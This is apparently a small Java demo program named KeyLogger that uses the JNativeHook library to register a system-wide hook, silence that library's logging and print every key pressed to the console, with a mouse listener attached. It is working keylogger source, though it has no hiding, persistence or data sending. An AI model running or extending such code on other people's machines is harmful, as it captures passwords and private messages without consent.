package com.rnakasato.keylogger;

import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener{
	private static int counter = 0;
	public static void main(String[] args) {
		try {
			GlobalScreen.registerNativeHook();		
		} catch (Exception e) {
			// TODO: handle exception
		}
		
		LogManager.getLogManager().reset();
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		
		GlobalScreen.addNativeKeyListener(new KeyLogger());
		GlobalScreen.addNativeMouseListener(new MouseLoggerListener());
		
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent event) {
		counter ++;
		if(counter % 50 == 0){
			System.out.println();
		}
		System.out.print(NativeKeyEvent.getKeyText(event.getKeyCode()));
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
	
	

}
